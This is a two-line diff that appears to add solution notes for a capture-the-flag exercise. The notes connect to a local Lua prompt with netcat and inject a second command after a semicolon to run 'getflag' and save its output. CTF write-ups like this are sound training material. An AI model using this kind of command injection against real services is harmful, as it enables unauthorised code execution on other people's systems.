@@ -1,0 +1,2 @@
+1. Get the lua prompt : "nc localhost 5151"
+2. Inject getflag : "; getflag > /var/tmp/flag"
